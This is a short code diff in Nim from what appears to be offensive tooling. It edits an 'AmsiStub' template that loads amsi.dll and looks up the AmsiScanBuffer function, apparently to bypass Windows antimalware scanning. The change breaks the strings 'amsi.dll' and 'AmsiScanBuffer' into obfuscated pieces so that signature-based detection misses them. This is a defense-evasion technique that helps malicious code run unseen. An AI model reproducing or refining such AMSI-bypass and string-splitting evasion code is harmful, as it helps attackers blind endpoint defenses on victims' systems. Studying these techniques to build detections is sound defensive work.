@@ -1734,17 +1734,18 @@ let AmsiStub * = """
         threadCtx.ContextFlags = CONTEXT_ALL
 
         # Load amsi.dll if it hasn't be loaded alreay.
+        var split: string = obf("si.dll")
         if g_amsiScanBufferPtr == nil:
             when defined(DInvoke):
-                var amsi = MyGetModuleHandleA(obf("amsi.dll"))
+                var amsi = MyGetModuleHandleA(obf("am")&split)
             else:
-                var amsi = GetModuleHandleA(obf("amsi.dll"))
+                var amsi = GetModuleHandleA(obf("am")&split)
             
             var ModuleFileName: UNICODE_STRING
             when defined(DInvoke):
-                MyRtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
+                MyRtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
             else:
-                RtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
+                RtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
             
             when defined(DInvoke):
                 var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &amsi)
@@ -1758,12 +1759,12 @@ let AmsiStub * = """
             else:
                 when defined(verbose):
                     echo obf("[+] Loaded: amsi.dll")
-
+            var splitString: string = obf("ScanBuffer")
             if amsi != 0:
                 when defined(DInvoke):
-                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("AmsiScanBuffer")))
+                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("Amsi")&splitString))
                 else:
-                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("AmsiScanBuffer")))
+                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("Amsi")&splitString))
 
             if g_amsiScanBufferPtr == nil:
                 when defined(verbose):
